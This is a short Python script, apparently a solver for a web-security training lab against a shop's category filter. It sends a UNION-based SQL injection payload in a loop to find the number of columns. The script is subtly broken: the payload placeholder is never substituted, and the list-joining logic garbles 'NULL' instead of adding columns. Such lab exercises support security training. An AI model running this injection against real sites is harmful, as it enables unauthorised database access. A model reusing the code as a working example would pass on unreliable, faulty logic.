import sys
import logging
import argparse
import urllib3 #25 line ->

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__) #Ч : Создаёт логгер с именем текущего модуля (файла).
logging.basicConfig(
    stream=sys.stdout, #Логи выводятся в стандартный вывод (терминал).
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #Removes warnings about insecure HTTPS connections

def main(args):
    shop = Shop()
    nulls_list = ["NULL"]
    for i in range(1,20):
        nulls_list = ",".join(nulls_list)
        filter_path = "filter?category=' UNION SELECT {nulls}-- "
        resp = requests.get(shop.base_url + filter_path)
        if resp.status_code == 200:
            break
    shop.is_solved()
        

if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
    